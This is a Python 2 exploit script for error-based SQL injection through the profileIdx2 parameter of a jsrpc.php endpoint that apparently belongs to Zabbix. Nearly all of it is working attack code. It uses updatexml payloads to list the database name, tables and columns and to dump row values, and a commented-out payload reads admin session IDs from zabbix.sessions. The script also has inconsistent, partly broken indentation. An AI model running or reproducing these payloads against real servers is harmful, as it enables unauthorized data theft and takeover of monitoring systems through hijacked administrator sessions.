import requests
import re
import sys

tables = []
host = sys.argv[1]
base_url = "{host}/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=2 {payload}&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids%5B23297%5D=23297&action=showlatest&filter=&filter_task=&mark_color=1"

def get_data(content):
    result = re.findall(r"XPATH syntax error: '~(.+?)~'", content)
    if result:
        return result[0]
    else:
        return False

def confirm():
    payload = "or updatexml(1,concat(0x7e,(database()),0x7e),0) or''"
    res = requests.get(base_url.format(host = host, payload = payload))
    result = get_data(res.text)
    if result:
        print result

def confirmtables():
	index = 0
	while True:
		# payload = "or updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1),0x7e),0) or''"
	    payload = "or updatexml(1,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit "+str(index)+",1),0x7e),0) or''"
	    res = requests.get(base_url.format(host = host, payload = payload))
	    result = get_data(res.text)
	    if result:
	        tables.append(result)
	        index = index + 1
	        print("tables:"+result)
	    else:
	    	break

def confirmcolumns(table_name):
	# col = []
	index = 0
	while True:
		# payload = "or updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1),0x7e),0) or''"
	    payload = "or updatexml(1,concat(0x7e,(SELECT concat(column_name) FROM information_schema.columns WHERE table_name='"+table_name+"' limit "+str(index)+",1),0x7e),0) or''"
	    res = requests.get(base_url.format(host = host, payload = payload))
	    result = get_data(res.text)
	    if result:
	        # col.append(result)
			print result
			index = index + 1
	    else:
	    	break
	# resstr = ",".join(col)
	# confirmvalues(resstr,table_name)

def confirmvalues(resstr,table_name):
	index = 0
	while index < 10:
		# payload = "or updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1),0x7e),0) or''"
	    # payload = "or updatexml(0,concat(0x7e,(SELECT concat(column_name) FROM information_schema.columns WHERE table_name='"+table_name+"' limit "+str(index)+",1),0x7e),0) or''"
	    payload = "or updatexml(1,concat(0x7e,(SELECT concat_ws(':',"+resstr+") FROM "+table_name+" limit "+str(index)+",1),0x7e),0) or''"
	    res = requests.get(base_url.format(host = host, payload = payload))
	    result = get_data(res.text)
	    if result and result.find('admin')>=0:
	    	print table_name
	    	break
	    else:
	    	index = index + 1

def confirmvalue(resstr, table_name):
	index = 0
	while index < 4:
		# payload = "2 and (select 1 from (select count(*),concat((select(select concat(cast(concat(sessionid,0x7e,userid,0x7e,status) as char),0x7e)) from zabbix.sessions where status=0 and userid=1 LIMIT 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
		payload = "or updatexml(1,concat(0x7e,(SELECT concat_ws(':',"+resstr+") FROM "+table_name+" limit "+str(index)+",1),0x7e),0) or''"
		res = requests.get(base_url.format(host = host, payload = payload))
		result = get_data(res.text)
		if result:
			print result
			break
		index = index + 1


if __name__ == '__main__':
	#=============step1==================
	# confirm()
	#=============step2==================
    confirmtables()
    # for t in tables:
    # 	print("tables:"+t)
    	# confirmcolumns(t)
	#=============step3==================
    # confirmvalue()